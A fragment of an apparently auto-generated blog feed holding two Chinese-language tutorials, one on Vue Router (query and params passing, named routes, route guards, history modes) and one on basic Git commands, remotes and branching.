title="4.路由的query参数"></a>4.路由的query参数</h2><p>我们的父路由也可以给子路由传递参数，达到影响子路由数据的效果。而我们传递参数所使用的便是<strong>query参数</strong></p><p>query参数的位置和我们ajax发送请求加参数的位置一样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">      &lt;!-- :to后面解析为js语句，使用了es6模板语法 ``直接传递字符串，$&#123;&#125;传递表达式--字符串写法--&gt;</span><br><span class="line">&lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;&lt;router-link :to=&quot;`/home/message/detail?id=$&#123;m.id&#125;&amp;title=$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;&amp;nbsp;&amp;nbsp;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>但是这样子写参数多了会不美观，所以我们写成对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 推荐-对象写法 --&gt;</span><br><span class="line">&lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;</span><br><span class="line">  &lt;router-link</span><br><span class="line">    :to=&quot;&#123;</span><br><span class="line">      path: &#x27;/home/message/detail&#x27;,</span><br><span class="line">      query: &#123; id: m.id, title: m.title &#125;,</span><br><span class="line">    &#125;&quot;</span><br><span class="line">    &gt;&#123;&#123; m.title &#125;&#125;&lt;/router-link</span><br><span class="line">  &gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>将:to中的内容写成对象，数据展示更加直观</p><p>第二个问题：子路由如何收集这些数据呢？</p><p>我们先来查看我们传递了参数之后的<code>$route</code>：<img src="https://s2.loli.net/2022/06/20/Mf14mLnbv9lD8Ez.png" alt="query后的route.png"></p><p>新增了query属性，query属性里面就是我们传递的数据！</p><p>那我们直接使用它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;消息编号：&#123;&#123;$route.query.id&#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;消息标题：&#123;&#123;$route.query.title&#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>这样数据传输就大功告成了</p><h2 id="5-路由的命名"><a href="#5-路由的命名" class="headerlink" title="5.路由的命名"></a>5.路由的命名</h2><p>大家有没有觉得，当我们的路由嵌套变多，路径越写越长十分麻烦</p><p>那么现在，我们就使用名字来表示一个路由：添加<code>name</code>参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">children: [</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#x27;xiaodi&#x27;,</span><br><span class="line">        path: &#x27;detail&#x27;,</span><br><span class="line">        component: Detail,</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>但是我们的name参数在使用时，需要将to写成对象形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;</span><br><span class="line">  &lt;router-link</span><br><span class="line">    :to=&quot;&#123;</span><br><span class="line">      // path: &#x27;/home/message/detail&#x27;,</span><br><span class="line">      name : &#x27;xiaoxi&#x27;,//不用写冗长的路径名</span><br><span class="line">      query: &#123; id: m.id, title: m.title &#125;,</span><br><span class="line">    &#125;&quot;</span><br><span class="line">    &gt;&#123;&#123; m.title &#125;&#125;&lt;/router-link</span><br><span class="line">  &gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>十分好用</p><h2 id="6-params参数"><a href="#6-params参数" class="headerlink" title="6.params参数"></a>6.params参数</h2><p>我们也可以使用params参数传递参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;&lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;&lt;/li&gt;</span><br><span class="line">//后两个代表参数</span><br></pre></td></tr></table></figure><p>或者对象写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;</span><br><span class="line">  &lt;router-link</span><br><span class="line">    :to=&quot;&#123;</span><br><span class="line">      // path: &#x27;/home/message/detail&#x27;,</span><br><span class="line">      name : &#x27;xiaoxi&#x27;,//不用写冗长的路径名</span><br><span class="line">      params: &#123; id: m.id, title: m.title &#125;,</span><br><span class="line">    &#125;&quot;</span><br><span class="line">    &gt;&#123;&#123; m.title &#125;&#125;&lt;/router-link</span><br><span class="line">  &gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是，在对象写法中params不能和path一起搭配使用</p><p>然后我们需要在路由中修改path：添加占位符区分路径和参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">children: [</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#x27;xiaoxi&#x27;,</span><br><span class="line">        path: &#x27;detail/:id/:title&#x27;,//使用占位符接收params参数</span><br><span class="line">        component: Detail,</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>读取数据的时候使用<code>$route.params.xxx</code>就可以了</p><h2 id="7-props参数"><a href="#7-props参数" class="headerlink" title="7.props参数"></a>7.props参数</h2><p>但是当我们传递的参数过多的时候，每一个参数前加上<code>$route.params.xxx</code>十分不方便，那么我们可以使用props参数</p><p>props写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name: &#x27;xiaoxi&#x27;,</span><br><span class="line">path: &#x27;detail/:id/:title&#x27;,//使用占位符接收params参数</span><br><span class="line">component: Detail,</span><br><span class="line">//第一种写法，对象写法-一般不使用</span><br><span class="line">// props:&#123;id:&#x27;001&#x27;,title:&#x27;hello&#x27;&#125;</span><br><span class="line">//第二种写法，布尔值写法，将params参数转换为props传给detail</span><br><span class="line">// props:true</span><br><span class="line">//第三种写法，函数写法，顾及到了query参数</span><br><span class="line">props($route) &#123;</span><br><span class="line">    return &#123; id: $route.query.id, title: $route.query.title &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在detail组件中申明接收：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">props: [&quot;id&quot;, &quot;title&quot;],</span><br><span class="line">//正常使用</span><br><span class="line">&lt;li&gt;消息编号：&#123;&#123; id &#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;消息标题：&#123;&#123; title &#125;&#125;&lt;/li&gt;</span><br></pre></td></tr></table></figure><h2 id="8-replace模式"><a href="#8-replace模式" class="headerlink" title="8.replace模式"></a>8.replace模式</h2><p>1.作用：控制路由跳转时操作浏览器历史记录的模式</p><p>2.浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>，<code>push</code>是追加历史记录，<code>replace</code>是替换当前记录。路由跳转时候默认为<code>push</code></p><p>3.如何开启<code>replace</code>模式：<code>&lt;router-link replace :to=&quot;</code>/home/message/detail/${m.id}/${m.title}<code>&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</code></p><h2 id="9-编程式路由跳转"><a href="#9-编程式路由跳转" class="headerlink" title="9.编程式路由跳转"></a>9.编程式路由跳转</h2><p>不借助<code>router-link</code>实现路由跳转</p><p>我们通过<code>$router</code>中的方法实现路由的跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pushShow(m)&#123;</span><br><span class="line">  this.$router.push(&#123;//内部和router-link，to的内部一样</span><br><span class="line">      name : &#x27;xiaoxi&#x27;,//不用写冗长的路径名</span><br><span class="line">      query: &#123; id: m.id, title: m.title &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br><span class="line">replaceShow(m)&#123;</span><br><span class="line">    this.$router.replace(&#123;</span><br><span class="line">      name : &#x27;xiaoxi&#x27;,//不用写冗长的路径名</span><br><span class="line">      query: &#123; id: m.id, title: m.title &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样可以是实现路由的前进和后退</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">back()&#123;</span><br><span class="line">  this.$router.back()</span><br><span class="line">&#125;,</span><br><span class="line">forward()&#123;</span><br><span class="line">  this.$router.forward()</span><br><span class="line">&#125;,</span><br><span class="line">go()&#123;</span><br><span class="line">  this.$router.go(+2)//代表前进两次，-2代表后退两次</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-缓存路由组件"><a href="#10-缓存路由组件" class="headerlink" title="10.缓存路由组件"></a>10.缓存路由组件</h2><p>让不展示的路由组件保持挂载，不被销毁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive include=&quot;News&quot;&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure><p> 如果不写include属性，则是默认缓存所有在这里展示的组件，include中填写的是<strong>组件名</strong></p><p>或者写成数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:include=[&#x27;News&#x27;,&#x27;Message&#x27;]</span><br></pre></td></tr></table></figure><h2 id="11-生命周期钩子"><a href="#11-生命周期钩子" class="headerlink" title="11.生命周期钩子"></a>11.生命周期钩子</h2><p>路由组件的两个独有的生命周期钩子，用于捕获路由组件的激活状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">activated()&#123;</span><br><span class="line">  console.log(&#x27;News组件被激活了&#x27;);</span><br><span class="line">&#125;,</span><br><span class="line">deactivated()&#123;</span><br><span class="line">  console.log(&#x27;News组件失活了&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-路由守卫"><a href="#12-路由守卫" class="headerlink" title="12.路由守卫"></a>12.路由守卫</h2><p>为了保护我们的路由安全而设置</p><h3 id="1-前置路由守卫"><a href="#1-前置路由守卫" class="headerlink" title="1.前置路由守卫"></a>1.前置路由守卫</h3><p>在初始化和路由切换的时候执行一个函数（注意这里先用route去接VueRouter,在最后才暴露）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">router.beforeEach((to, from, next) =&gt; &#123;</span><br><span class="line">    if (to.fullPath === &#x27;/home/news&#x27; || to.fullPath === &#x27;/home/message&#x27;) &#123;//去这两个路由加判断</span><br><span class="line">        console.log(to,from);</span><br><span class="line">        if (localStorage.getItem(&#x27;school&#x27;)===&#x27;swpu&#x27;)&#123;</span><br><span class="line">            next()</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            alert(&#x27;权限不够&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        next()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>如上面代码所示，我们在这个函数中可以拿到三个参数，next是用于跳转的，to和from如下图</p><p><img src="https://s2.loli.net/2022/06/20/qKtY8lSCFvjfz4V.png" alt="从home跳转到xxx.png"></p><p>其中有各种各样的属性，我们可以读取属性如：path，name，进行判断</p><h3 id="2-后置路由守卫"><a href="#2-后置路由守卫" class="headerlink" title="2.后置路由守卫"></a>2.后置路由守卫</h3><p>补充：meta（路由元信息）-在路由元信息中加入isAuth参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">path: &#x27;news&#x27;,</span><br><span class="line">component: News,</span><br><span class="line">meta:&#123;isAuth:true&#125;//权限校验配置</span><br></pre></td></tr></table></figure><p>可以简化我们路由的判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (to.meta.isAuth) &#123;//去这两个路由加判断</span><br><span class="line">    console.log(to,from);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后置路由守卫，顾名思义，就是在跳转之后执行的函数–<code>afterEach</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//后置路由守卫</span><br><span class="line">router.afterEach((to,from)=&gt;&#123;</span><br><span class="line">    document.title = to.meta.title || &#x27;欢迎&#x27;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>里面进行我们跳转之后为网页标签的一个修改</p><h3 id="3-独享路由守卫"><a href="#3-独享路由守卫" class="headerlink" title="3.独享路由守卫"></a>3.独享路由守卫</h3><p>独享路由守卫写在我们路由的配置项当中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">path: &#x27;news&#x27;,</span><br><span class="line">component: News,</span><br><span class="line">meta:&#123;isAuth:true,title:&#x27;新闻&#x27;&#125;,//权限校验配置</span><br><span class="line">//独享路由守卫</span><br><span class="line">beforeEnter: (to, from, next) =&gt; &#123;</span><br><span class="line">    if (to.meta.isAuth) &#123;//去这两个路由加判断</span><br><span class="line">        console.log(to,from);</span><br><span class="line">        if (localStorage.getItem(&#x27;school&#x27;)===&#x27;swpu&#x27;)&#123;</span><br><span class="line">            next()</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            alert(&#x27;权限不够&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        next()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且独享路由守卫只有前置守卫（beforeEnter）没有后置</p><p>后置路由守卫统一写到afterEach当中</p><h3 id="4-组件内路由守卫"><a href="#4-组件内路由守卫" class="headerlink" title="4.组件内路由守卫"></a>4.组件内路由守卫</h3><p>我们组件内部也可以加入路由守卫——分别是<code>beforeRouteEnter</code>和<code>beforeRouteLeave</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//使用路由规则，进入组件前</span><br><span class="line">beforeRouteEnter(to, from, next) &#123;</span><br><span class="line">  if (to.meta.isAuth) &#123;</span><br><span class="line">    //去这两个路由加判断</span><br><span class="line">    console.log(to, from);</span><br><span class="line">    if (localStorage.getItem(&quot;school&quot;) === &quot;swpu&quot;) &#123;</span><br><span class="line">      next();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      alert(&quot;权限不够&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">beforeRouteLeave (to, from, next) &#123;</span><br><span class="line">  //在离开组件前执行--保存数据。。。</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-路由器的两种工作模式"><a href="#13-路由器的两种工作模式" class="headerlink" title="13.路由器的两种工作模式"></a>13.路由器的两种工作模式</h2><p>1.对于一个url来说，什么是hash值？——#及其以后的内容就是hash值</p><p>2.hash值不会包含在http请求中，即hash值不会带给服务器</p><p>3.hash模式：</p><p>​        1.地址中永远带着#号</p><p>​        2.若以后将地址通过第三方手机app分享，有可能会被标记不合法</p><p>​        3.兼容性较好</p><p>4.history模式：</p><p>​        1.地址干净</p><p>​        2.兼容性和hash模式相比略差</p><p>​        3.应用部署上线时需要后端人员支持，解决刷新页面报404的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const router = new vueRouter(&#123;</span><br><span class="line">    mode:&#x27;hash&#x27;,//这里设置模式</span><br><span class="line">    routes: </span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git</title>
    <link href="/2022/05/16/Git/"/>
    <url>/2022/05/16/Git/</url>
    
    <content type="html"><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="什么是Git"><a href="#什么是Git" class="headerlink" title="什么是Git"></a>什么是Git</h2><p>相信大家在认识Git的时候都看到了这句话——Git是目前世界上最先进的分布式版本控制系统</p><p>但是Git到底能干什么呢？（这里用一张别人画的便于理解的图）</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\什么是git.png" alt="什么是git"></p><p>Workspace：工作区<br>Index / Stage：暂存区<br>Repository：仓库区（或本地仓库）<br>Remote：远程仓库</p><p>也许现在还不是很看得到这个图，继续看下去</p><h2 id="Git基本命令"><a href="#Git基本命令" class="headerlink" title="Git基本命令"></a>Git基本命令</h2><h3 id="1-git-config-–global"><a href="#1-git-config-–global" class="headerlink" title="1.git config –global"></a>1.git config –global</h3><p>这个命令用于设置你的用户名和邮箱，当然你可以为不同的仓库指定不同的用户名和邮箱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//设置用户名</span><br><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">//设置邮箱</span><br><span class="line">git config --global user.emil &quot;xxx&quot;</span><br></pre></td></tr></table></figure><h3 id="2-git-init"><a href="#2-git-init" class="headerlink" title="2.git init"></a>2.git init</h3><p>现在我们需要创建一个本地仓库（repository），新建一个文件夹，然后选择<code>Git Bush Here</code></p><p>然后输入<code>git init</code>，便把这个目录变成可以管理的仓库。</p><p>这个时候我们进入这个文件夹就可以看到我们的<code>.git </code>文件</p><p>如果看不到，应该是没有选择显示隐藏文件夹</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git.git文件.png" alt="git文件"></p><h3 id="3-git-add，git-commit，git-status，git-diff"><a href="#3-git-add，git-commit，git-status，git-diff" class="headerlink" title="3.git add，git commit，git status，git diff"></a>3.git add，git commit，git status，git diff</h3><p>在最开始的图中我们可以看到<code>add</code>是链接我们的工作区和暂存区</p><p><code>git add xxx</code>就可以提交我们的一个文件到暂存区</p><p><code>git commit -m &quot;提交的注释&quot;</code>是将暂存区内容提交到仓库</p><p>![git commit](D:\新建文件夹\文件\GitHub\pic\git\git commit.png)</p><p><code>git status</code>参看是否还有文件未提交</p><p>如果我们对文件做了修改，<code>git status</code>就会飘红</p><p>这时候我们可以使用<code>git diff</code>参看哪里不一样</p><p>确认无误后再<code>git add</code>，<code>git commit</code></p><h3 id="4-git-log-，git-reset-–hard-HEAD-，git-checkout-–xxx"><a href="#4-git-log-，git-reset-–hard-HEAD-，git-checkout-–xxx" class="headerlink" title="4.git log ，git reset –hard HEAD^，git checkout  –xxx"></a>4.git log ，git reset –hard HEAD^，git checkout  –xxx</h3><p><code>git log</code>是显示提交日志</p><p><code>git reset --hard HEAD^</code>便是回退到上一个版本</p><p>上上个版本就是<code>git reset --hard HEAD^^</code></p><p>或者指定上100个版本<code>git reset --hard HEAD~100</code></p><p>更或者回到指定版本：</p><p>先试用<code>git reflog</code>参看版本号</p><p>然后<code>git reset --hard xxx</code></p><p>我们还可以参看内容<code>cat xxx</code></p><p>如果我们需要撤销修改和删除文件操作</p><p>执行<code>git checkout  --xxx</code></p><h3 id="5-删除文件"><a href="#5-删除文件" class="headerlink" title="5.删除文件"></a>5.删除文件</h3><p>当我们需要删除文件b时，一般会选择手动删除和<code>rm b.txt</code></p><p>但是如果是从版本库中删除呢？</p><p>那就是在删除之后commit提交一遍</p><p>在没有commit之前都是可以通过checkout恢复的</p><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><h3 id="1-建立远程仓库"><a href="#1-建立远程仓库" class="headerlink" title="1.建立远程仓库"></a>1.建立远程仓库</h3><p>我们在GitHub上new repository，得到这样的页面</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\创建新仓库.png" alt="创建新仓库"></p><p>复制HTTPS的地址，然后Git Bush 输入</p><p><code>git remote add origin 复制的HTTPS</code>，这样便做好了一个本地和远程的链接</p><h3 id="2-git-push"><a href="#2-git-push" class="headerlink" title="2.git push"></a>2.git push</h3><p><code>git push</code>就是把本地仓库内容推送到远程</p><p>第一次推送的时候加上 -u <code>git push -u origin master</code></p><p>以后提交便可以<code>git push origin master</code></p><p>如果分支不是master</p><p>那么就是<code>git push origin 分支名</code></p><p>还有强制推送（不建议）</p><p><code>git push origin 分支名 -f</code></p><h3 id="3-删除本地和远程的链接"><a href="#3-删除本地和远程的链接" class="headerlink" title="3.删除本地和远程的链接"></a>3.删除本地和远程的链接</h3><p>使用<code>git remote rm origin</code>取消链接</p><h2 id="GitHub同步（克隆仓库）"><a href="#GitHub同步（克隆仓库）" class="headerlink" title="GitHub同步（克隆仓库）"></a>GitHub同步（克隆仓库）</h2><p>我们在写项目的时候，一般都是一个团队去完成一个项目，那么同步GitHub仓库就显得尤为重要。接下来介绍一下如何同步自己和别人的仓库。</p><h3 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h3><p><img src="D:\新建文件夹\文件\GitHub\pic\git\新建仓库.png" alt="新建仓库"></p><p>输入仓库名字，如何下面会有创建按钮</p><h3 id="2-创建文件夹用于克隆"><a href="#2-创建文件夹用于克隆" class="headerlink" title="2. 创建文件夹用于克隆"></a>2. 创建文件夹用于克隆</h3><p>我们在本机上创建一个文件夹，这个之后会存放我们的文件和代码</p><p>然后点击文件夹</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\克隆仓库.png" alt="克隆仓库"></p><p>点击<code>Git Bash Here</code>，输入<code>git clone xxxx</code>，xxxx是你<strong>想要克隆的仓库的https</strong></p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\被克隆仓库.png" alt="被克隆仓库"></p><p>进入你想要克隆的仓库，点击Code可以看到</p><p><strong>这样我们的结果就是得到了别人仓库中的文件</strong></p><h3 id="3-上传到自己的仓库"><a href="#3-上传到自己的仓库" class="headerlink" title="3.上传到自己的仓库"></a>3.上传到自己的仓库</h3><p>接下来再在创建的文件夹<code>Git Bash Here</code> ，如果你现在只有一个仓库（新建的仓库是你的第一个仓库）——输入：</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220516121230810.png" alt="image-20220516121230810"></p><p>如果这是你的第二个仓库——输入：</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\上传到仓库3.png" alt="上传到仓库3"></p><p>第x个仓库就是orginx</p><p>然后上传到master或者main分支：</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\上传到仓库2.png" alt="上传到仓库2"></p><h3 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h3><p><img src="D:\新建文件夹\文件\GitHub\pic\git\克隆仓库效果.png" alt="克隆仓库效果"></p><h2 id="Git创建与合并分支"><a href="#Git创建与合并分支" class="headerlink" title="Git创建与合并分支"></a>Git创建与合并分支</h2><p>我们的master叫做主分支，现在我们创建一个dev分支</p><p><code>git checkout -b dev</code>表示创建dev分支并切换</p><p>之后，我们可以使用<code>git branch</code> 参看分支</p><p>使用<code>git checkout 分支名</code>可以切换到指定分支</p><p>如果我们想要两个分支同步，使用<code>git merge dev</code>实现合并指定分支到当前分支上。</p><p>在执行完操作后记得commit 和push，而且<code>git push origin 分区名</code></p><p>查看分支：git branch</p><p>创建分支：git branch name</p><p>切换分支：git checkout name</p><p>创建+切换分支：git checkout –b name</p><p>合并某分支到当前分支：git merge name</p><p>删除分支：git branch –d name</p><h3 id="分支策略："><a href="#分支策略：" class="headerlink" title="分支策略："></a>分支策略：</h3><p>分支策略：首先master主分支应该是非常稳定的，也就是用来发布新版本，一般情况下不允许在上面干活，干活一般情况下在新建的dev分支上干活，干完后，比如上要发布，或者说dev分支代码稳定后可以合并到主分支master上来。</p><h2 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h2><p>参看远程库信息：<code>git remote</code></p><p>参看远程库详细信息：<code>git remote -v</code>、</p><h3 id="1-克隆分支"><a href="#1-克隆分支" class="headerlink" title="1.克隆分支"></a>1.克隆分支</h3><p><code>git clone 远程库地址</code>，此时目录下就会生成远程库文件</p><h3 id="2-推送分支"><a href="#2-推送分支" class="headerlink" title="2.推送分支"></a>2.推送分支</h3><p>比如我们要在dev分支上开发，那么我们就需要在克隆的库中建立一个dev分支 <code>git checkout -b dev origin/dev</code></p><p>推送分支就是使用我们的<code>git push origin dev</code></p><h3 id="3-get-pull"><a href="#3-get-pull" class="headerlink" title="3.get pull"></a>3.get pull</h3><p><code>git pull </code>的本质是 <code>git fetch</code> +<code>git merge</code></p><p> <code>git fetch</code>是从远端获取最新版本到本地，但是不会合并分支</p><p><code>git merge</code>就帮助我们合并了分支</p><p>还有一个<code>git pull --rebase</code></p><p>rebase 另外一个分支是将另外一个分支的所有版本复制到自己分支后面</p><p>这个是rebase：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> A---B---C topic</span><br><span class="line">/        </span><br><span class="line">  D---E---F---G---H ---A&#x27;---B&#x27;---C&#x27;master</span><br></pre></td></tr></table></figure><p>这个是pull：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> A---B---C topic</span><br><span class="line">/         \</span><br><span class="line">  D---E---F---G---H master</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vuex</title>
    <link href="/2022/05/16/vuex/"/>
    <url>/2022/05/16/vuex/</url>
    
